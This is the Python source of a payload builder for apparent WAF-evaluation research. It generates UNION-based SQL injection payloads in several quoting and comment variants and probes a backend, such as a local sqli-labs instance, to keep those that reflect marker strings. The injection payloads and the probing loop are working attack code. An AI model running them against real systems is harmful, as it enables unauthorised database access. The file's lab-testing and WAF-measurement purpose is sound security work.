"""
tools/payload_builder.py
=========================
Generate and validate UNION-based SQLi payloads with strict markers.

Workflow (BWAFSQLi-style):
    1. Generate candidate payloads varying:
         - injection context (numeric / single-quote / double-quote / paren)
         - column count (2..6)
         - marker column positions (left / right / both)
         - comment style (-- - / # / --+)
         - extraction expression (database / user / version)
    2. Send each candidate to the backend WITHOUT WAF protection.
    3. Keep only payloads whose response reflects both SEQSQLI_START
       and SEQSQLI_END markers in the correct order.
    4. Persist the validated set to CSV for downstream FNR0 / IFNR /
       SPBARC measurement.

A payload that fails validation here is excluded from the test set —
this prevents broken payloads from being mis-counted as bypasses at
evaluation time.

USAGE
-----
    python -m tools.payload_builder \
        --url "http://localhost/sqli-labs/Less-1/" \
        --param id \
        --columns 2,3,4 \
        --contexts numeric,single_quote,paren_single \
        --output payloads_valid.csv \
        --confirm-authorized-lab

    # Generate only, no HTTP probes:
    python -m tools.payload_builder \
        --columns 3 --contexts single_quote \
        --generate-only \
        --output candidates.csv \
        --confirm-authorized-lab

The --confirm-authorized-lab flag is required to remind users that this
tool actively probes a backend and must only be run against a system
the operator owns or has explicit authorization to test.
"""

from __future__ import annotations

import argparse
import csv
import itertools
import sys
import time
from dataclasses import dataclass, asdict
from typing import Iterator, List, Optional

from seqsqli.core.response import STRICT_MARKERS, has_strict_markers


# ---------------------------------------------------------------------------
# Candidate construction
# ---------------------------------------------------------------------------

# Injection-context templates. Each one defines how the parameter VALUE
# (everything after `?id=`) should be wrapped before the UNION SELECT.
#
#   prefix : prepended to the payload (closes whatever wraps the value)
#   suffix : appended (comment that swallows the rest of the original query)
#
# The marker probe uses a NEGATIVE numeric prefix (-1) so the original
# SELECT returns empty, letting the UNION result reflect through.
CONTEXTS = {
    "numeric":       {"prefix": "-1 ",         "suffix": "-- -"},
    "single_quote":  {"prefix": "-1' ",        "suffix": "-- -"},
    "double_quote":  {"prefix": "-1\" ",       "suffix": "-- -"},
    "paren_single":  {"prefix": "-1') ",       "suffix": "-- -"},
    "paren_double":  {"prefix": "-1\") ",      "suffix": "-- -"},
    "paren2_single": {"prefix": "-1')) ",      "suffix": "-- -"},
}

COMMENT_STYLES = {
    "dash":    "-- -",
    "hash":    "#",
    "dashplus": "--+",
}

EXTRACTION_EXPRS = ["database()", "user()", "version()"]


@dataclass
class PayloadSpec:
    payload_id:           str
    payload:              str
    context:              str
    columns:              int
    comment_style:        str
    marker_column_left:   int
    marker_column_right:  int
    extraction_expr:      str
    valid_without_waf:    str = ""    # filled after probing
    status_code:          str = ""
    response_len:         str = ""
    notes:                str = ""


def _build_union_select(columns: int,
                        marker_left: int,
                        marker_right: int,
                        extraction_expr: str) -> str:
    """Build the column list for UNION SELECT.

    Columns are numbered 1..columns. The marker_left column emits
    SEQSQLI_START, marker_right emits SEQSQLI_END, one other column
    emits the extraction expression. Remaining columns emit their
    index as a placeholder.
    """
    start_m, end_m = STRICT_MARKERS
    parts: List[str] = []
    extract_col = None
    # Pick a column for the extraction expression — pick one that is
    # neither marker_left nor marker_right.
    for c in range(1, columns + 1):
        if c != marker_left and c != marker_right:
            extract_col = c
            break

    for c in range(1, columns + 1):
        if c == marker_left:
            parts.append(f"'{start_m}'")
        elif c == marker_right:
            parts.append(f"'{end_m}'")
        elif c == extract_col:
            parts.append(extraction_expr)
        else:
            parts.append(str(c))
    return ",".join(parts)


def generate_candidates(columns_list: List[int],
                        contexts: List[str],
                        comment_styles: List[str],
                        extraction_exprs: List[str]) -> Iterator[PayloadSpec]:
    """Yield candidate PayloadSpec objects across the product of options."""
    pid = 0
    for ctx_name in contexts:
        if ctx_name not in CONTEXTS:
            print(f"[!] Unknown context '{ctx_name}', skipping.")
            continue
        ctx = CONTEXTS[ctx_name]
        for n_cols in columns_list:
            if n_cols < 2:
                continue  # need at least 2 columns for marker pair
            # Marker placement: try (left=1, right=n_cols) and one nearby pair.
            placements = [(1, n_cols)]
            if n_cols >= 3:
                placements.append((2, n_cols))
            for m_left, m_right in placements:
                if m_left == m_right:
                    continue
                for ext_expr in extraction_exprs:
                    for cs_name in comment_styles:
                        if cs_name not in COMMENT_STYLES:
                            continue
                        suffix = COMMENT_STYLES[cs_name]
                        union_cols = _build_union_select(
                            n_cols, m_left, m_right, ext_expr,
                        )
                        payload = (
                            f"{ctx['prefix']}UNION SELECT {union_cols}{suffix}"
                        )
                        pid += 1
                        yield PayloadSpec(
                            payload_id=f"p{pid:04d}",
                            payload=payload,
                            context=ctx_name,
                            columns=n_cols,
                            comment_style=cs_name,
                            marker_column_left=m_left,
                            marker_column_right=m_right,
                            extraction_expr=ext_expr,
                        )


# ---------------------------------------------------------------------------
# Validation against backend (no WAF)
# ---------------------------------------------------------------------------

def _validate_payload(url: str, param: str, spec: PayloadSpec,
                      timeout: float, delay: float) -> PayloadSpec:
    """Send one candidate to the backend and check marker reflection.

    Returns the spec with valid_without_waf / status_code / response_len
    fields populated.
    """
    # Lazy import — only needed when actually probing.
    import requests
    import urllib.parse

    # Smart URL build: preserve %XX sequences if any (none expected here,
    # but be defensive). Use a permissive `safe` set so spaces become %20.
    encoded = urllib.parse.quote(spec.payload, safe="-_.~!*()+,;:@/=&")
    sep = "&" if "?" in url else "?"
    full_url = f"{url}{sep}{param}={encoded}"

    try:
        resp = requests.get(full_url, timeout=timeout,
                            allow_redirects=True)
        status = resp.status_code
        text = resp.text
        spec.status_code = str(status)
        spec.response_len = str(len(text))
        if has_strict_markers(text):
            spec.valid_without_waf = "yes"
        else:
            spec.valid_without_waf = "no"
            # Heuristic notes — useful for debugging dataset gaps.
            if "error" in text.lower() and "sql" in text.lower():
                spec.notes = "sql_error"
            elif status >= 500:
                spec.notes = "server_error"
            elif spec.payload.count(",") != spec.columns - 1:
                spec.notes = "column_count_mismatch"
            else:
                spec.notes = "no_marker_reflected"
    except requests.exceptions.Timeout:
        spec.valid_without_waf = "no"
        spec.status_code = "408"
        spec.notes = "timeout"
    except Exception as e:
        spec.valid_without_waf = "no"
        spec.status_code = "exception"
        spec.notes = f"err:{type(e).__name__}"

    time.sleep(delay)
    return spec


# ---------------------------------------------------------------------------
# IO
# ---------------------------------------------------------------------------

FIELDNAMES = [
    "payload_id", "payload", "context", "columns",
    "comment_style", "marker_column_left", "marker_column_right",
    "extraction_expr", "valid_without_waf",
    "status_code", "response_len", "notes",
]


def write_csv(path: str, specs: List[PayloadSpec]) -> None:
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=FIELDNAMES)
        writer.writeheader()
        for s in specs:
            writer.writerow({k: asdict(s)[k] for k in FIELDNAMES})


def _parse_int_list(s: str) -> List[int]:
    """Parse '2,3,4' or '2-5' into [2,3,4] or [2,3,4,5]."""
    if "-" in s and "," not in s:
        lo, hi = s.split("-", 1)
        return list(range(int(lo), int(hi) + 1))
    return [int(x) for x in s.split(",") if x.strip()]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Generate and validate UNION-based SQLi payloads with strict markers.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", type=str,
                        help="Target URL of vulnerable backend WITHOUT WAF "
                             "(e.g. http://localhost/sqli-labs/Less-1/). "
                             "Required unless --generate-only is set.")
    parser.add_argument("--param", type=str, default="id",
                        help="Vulnerable parameter name (default: id)")
    parser.add_argument("--columns", type=str, default="2,3,4,5",
                        help="Comma list or range (e.g. '3', '2,3,4', '2-5')")
    parser.add_argument("--contexts", type=str,
                        default="numeric,single_quote,double_quote,paren_single",
                        help=f"Comma list. Available: {','.join(CONTEXTS.keys())}")
    parser.add_argument("--comment-styles", type=str,
                        default="dash,hash,dashplus",
                        help=f"Comma list. Available: {','.join(COMMENT_STYLES.keys())}")
    parser.add_argument("--extractions", type=str,
                        default="database(),user(),version()",
                        help="Comma list of extraction expressions")
    parser.add_argument("--output", type=str, default="payloads_valid.csv",
                        help="Output CSV path")
    parser.add_argument("--all-candidates-output", type=str, default=None,
                        help="(Optional) Write ALL candidates (valid+invalid) "
                             "to this CSV for diagnostics")
    parser.add_argument("--generate-only", action="store_true",
                        help="Skip validation; emit candidate CSV only")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--delay", type=float, default=0.05,
                        help="Seconds between probes (rate limit hygiene)")
    parser.add_argument("--max-candidates", type=int, default=0,
                        help="Truncate candidate set (0 = no limit)")
    parser.add_argument("--confirm-authorized-lab", action="store_true",
                        help="REQUIRED to actually run. Reminds operator that "
                             "this script probes a backend and must only be "
                             "used on systems they own or have authorization "
                             "to test.")
    args = parser.parse_args()

    if not args.confirm_authorized_lab:
        print("[!] --confirm-authorized-lab is required.\n"
              "    This tool actively probes a backend with SQLi payloads.\n"
              "    Use only against systems you own or have explicit\n"
              "    authorization to test.")
        sys.exit(2)

    if not args.generate_only and not args.url:
        print("[!] --url is required unless --generate-only is set.")
        sys.exit(2)

    columns_list   = _parse_int_list(args.columns)
    contexts       = [c.strip() for c in args.contexts.split(",") if c.strip()]
    comment_styles = [c.strip() for c in args.comment_styles.split(",") if c.strip()]
    extractions    = [e.strip() for e in args.extractions.split(",") if e.strip()]

    print("=" * 60)
    print(" SeqSQLi Payload Builder")
    print(f" Columns      : {columns_list}")
    print(f" Contexts     : {contexts}")
    print(f" Comments     : {comment_styles}")
    print(f" Extractions  : {extractions}")
    print(f" Mode         : {'generate-only' if args.generate_only else 'validate-against-backend'}")
    if not args.generate_only:
        print(f" Target       : {args.url} (param={args.param})")
    print("=" * 60)

    candidates = list(generate_candidates(
        columns_list, contexts, comment_styles, extractions,
    ))
    if args.max_candidates > 0:
        candidates = candidates[: args.max_candidates]
    print(f"[*] Generated {len(candidates)} candidates")

    if args.generate_only:
        write_csv(args.output, candidates)
        print(f"[*] Wrote {len(candidates)} candidates to {args.output}")
        return

    # Validate each candidate.
    valid: List[PayloadSpec] = []
    for i, spec in enumerate(candidates, 1):
        spec = _validate_payload(args.url, args.param, spec,
                                 args.timeout, args.delay)
        if spec.valid_without_waf == "yes":
            valid.append(spec)
        if i % 20 == 0 or i == len(candidates):
            sr = len(valid) / i * 100
            print(f"  [{i:>4}/{len(candidates)}] valid={len(valid)} ({sr:.1f}%)")

    write_csv(args.output, valid)
    print(f"\n[*] Validated payloads: {len(valid)} / {len(candidates)} "
          f"({len(valid)/len(candidates)*100:.1f}%)")
    print(f"[*] Wrote validated set to {args.output}")

    if args.all_candidates_output:
        write_csv(args.all_candidates_output, candidates)
        print(f"[*] Wrote all candidates (with diagnostics) to "
              f"{args.all_candidates_output}")


if __name__ == "__main__":
    main()
